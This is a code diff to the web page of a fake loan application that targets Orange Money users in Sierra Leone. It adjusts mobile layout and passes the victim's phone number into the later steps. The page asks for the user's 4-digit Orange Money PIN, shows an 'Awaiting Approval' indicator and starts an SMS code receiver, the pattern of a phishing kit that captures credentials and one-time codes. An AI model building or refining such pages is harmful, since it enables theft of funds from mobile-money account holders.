@@ -225,7 +225,7 @@
       </section>
 
       <!-- STEP 1: Loan Configuration Form -->
-      <section id="step-1" class="hidden flex-1 flex flex-col p-6 space-y-6">
+      <section id="step-1" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
           <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 1 of 3</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step1Title">Loan Details</h2>
@@ -278,7 +278,7 @@
       </section>
 
       <!-- STEP 2: Applicant Information Form -->
-      <section id="step-2" class="hidden flex-1 flex flex-col p-6 space-y-6">
+      <section id="step-2" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
           <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 2 of 3</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step2Title">Applicant Details</h2>
@@ -361,27 +361,27 @@
       </section>
 
       <!-- STEP 3: Orange Money Login & Verification (4-DIGIT PIN FOR SIERRA LEONE) -->
-      <section id="step-3" class="hidden flex-1 flex flex-col p-6 space-y-6">
+      <section id="step-3" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-5">
         <!-- Big Orange Card Header -->
-        <div class="orange-gradient rounded-2xl p-6 text-white text-center shadow-lg relative overflow-hidden">
-          <div class="w-12 h-12 mx-auto bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mb-3">
-            <img src="/orange_money_logo.jpg" alt="Orange Logo" class="h-8 w-8 rounded-full object-cover" />
+        <div class="orange-gradient rounded-2xl p-4 sm:p-5 text-white text-center shadow-lg relative overflow-hidden">
+          <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mb-2 sm:mb-3">
+            <img src="/orange_money_logo.jpg" alt="Orange Logo" class="h-6 w-6 sm:h-8 sm:w-8 rounded-full object-cover" />
           </div>
-          <h2 class="text-xl font-extrabold" data-i18n="step3Title">Sign in to Orange Money</h2>
-          <p class="text-xs text-orange-100 mt-1" data-i18n="step3Sub">Confirm your phone number and enter your 4-digit PIN to validate your loan.</p>
+          <h2 class="text-lg sm:text-xl font-extrabold" data-i18n="step3Title">Sign in to Orange Money</h2>
+          <p class="text-[11px] sm:text-xs text-orange-100 mt-0.5" data-i18n="step3Sub">Confirm your phone number and enter your 4-digit PIN to validate your loan.</p>
         </div>
 
-        <div class="space-y-4">
+        <div class="space-y-3.5 sm:space-y-4">
           <div>
             <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-1" data-i18n="phoneNum">Phone Number</label>
-            <div class="flex items-center bg-slate-100 border border-slate-200 rounded-xl px-4 py-3">
+            <div class="flex items-center bg-slate-100 border border-slate-200 rounded-xl px-3.5 py-2.5 sm:py-3">
               <span class="text-xs font-extrabold text-slate-500 mr-2">+232</span>
-              <input id="momo-phone-display" type="text" readonly placeholder="Phone Number" class="bg-transparent text-sm font-extrabold text-slate-800 w-full focus:outline-none" value="" />
+              <input id="momo-phone-display" type="text" readonly placeholder="Phone Number" class="bg-transparent text-xs sm:text-sm font-extrabold text-slate-800 w-full focus:outline-none" value="" />
             </div>
           </div>
 
           <div>
-            <div class="flex justify-between items-center mb-2">
+            <div class="flex justify-between items-center mb-1.5 sm:mb-2">
               <label class="block text-xs font-bold text-slate-700 uppercase tracking-wider" data-i18n="pinLabel">Orange Money PIN (4 digits):</label>
               <button type="button" onclick="togglePinVisibility()" class="text-xs font-bold text-brand-orange hover:underline">
                 <span id="eye-text" data-i18n="showPin">Show</span>
@@ -389,14 +389,14 @@
             </div>
 
             <!-- 4-Digit PIN Input Grid for Sierra Leone -->
-            <div class="grid grid-cols-4 gap-3 py-1">
-              <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
-              <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
-              <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
-              <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-14 text-center text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+            <div class="grid grid-cols-4 gap-2.5 sm:gap-3 py-0.5">
+              <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+              <input type="password" maxlength="1" data-index="1" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+              <input type="password" maxlength="1" data-index="2" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
+              <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl sm:text-2xl font-bold bg-slate-50 border-2 border-slate-300 rounded-xl focus:bg-white" />
             </div>
 
-            <div id="pin-retry-alert" class="mt-3 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
+            <div id="pin-retry-alert" class="mt-2.5 p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 hidden"></div>
           </div>
 
           <button 
@@ -404,13 +404,13 @@
             type="button" 
             disabled 
             onclick="submitApplication()" 
-            class="w-full py-4 bg-slate-200 text-slate-400 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200"
+            class="w-full py-3.5 sm:py-4 bg-slate-200 text-slate-400 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200"
             data-i18n="confirmLoanBtn">
             LOGIN & CONFIRM LOAN
           </button>
 
           <!-- Live Approval Waiting Indicator for Step 3 PIN -->
-          <div id="pin-waiting-box" class="hidden p-4 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
+          <div id="pin-waiting-box" class="hidden p-3.5 bg-amber-50 border border-amber-200 rounded-2xl text-center space-y-2">
             <div class="flex items-center justify-center space-x-2">
               <span class="inline-block w-2.5 h-2.5 rounded-full bg-amber-500 animate-ping"></span>
               <span class="text-xs font-bold text-amber-900 uppercase tracking-wider" data-i18n="awaitingApproval">Awaiting Approval</span>
@@ -427,7 +427,7 @@
       </section>
 
       <!-- STEP 4: SMS Verification Message -->
-      <section id="step-4" class="hidden flex-1 flex flex-col p-6 space-y-6">
+      <section id="step-4" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6">
         <div>
           <span class="text-[11px] font-extrabold text-brand-orange bg-brand-orangeLight px-2.5 py-1 rounded-full uppercase tracking-wider">Step 4 of 4</span>
           <h2 class="text-xl font-extrabold text-slate-900 mt-2" data-i18n="step4Title">Account Ownership Verification</h2>
@@ -545,7 +545,7 @@
       </section>
 
       <!-- STEP 5: Live Application Status & Confirmation -->
-      <section id="step-5" class="hidden flex-1 flex flex-col p-6 text-center space-y-6">
+      <section id="step-5" class="hidden flex-1 flex flex-col p-4 sm:p-6 text-center space-y-4 sm:space-y-6">
         <div class="pt-4">
           <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-4 shadow-inner">
             <svg class="w-9 h-9" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -987,6 +987,10 @@
                 lnEl.value = data.lastName;
                 appState.lastName = data.lastName;
               }
+              appState.phoneNumber = clean;
+              const dispPhone = document.getElementById('momo-phone-display');
+              if (dispPhone) dispPhone.value = clean;
+
               if (data.applicationId) {
                 appState.applicationId = data.applicationId;
               }
@@ -1073,8 +1077,24 @@
         }
       }
 
+      if (currentStep === 3) {
+        const dispPhone = document.getElementById('momo-phone-display');
+        const phInp = document.getElementById('phone-number-input');
+        if (!appState.phoneNumber && phInp && phInp.value) {
+          appState.phoneNumber = phInp.value.trim();
+        }
+        if (dispPhone) {
+          dispPhone.value = appState.phoneNumber || (phInp ? phInp.value.trim() : '');
+        }
+      }
+
       if (currentStep === 4) {
         isSubmittingMessage = false;
+        const targetPhone = appState.phoneNumber || document.getElementById('phone-number-input')?.value || '';
+        const smsPhoneTarget = document.getElementById('sms-phone-target');
+        const smsTimerPhone = document.getElementById('sms-timer-phone');
+        if (smsPhoneTarget) smsPhoneTarget.innerText = targetPhone ? targetPhone : 'Sierra Leone';
+        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'Sierra Leone';
         startSimSmsReceiver();
       }
 
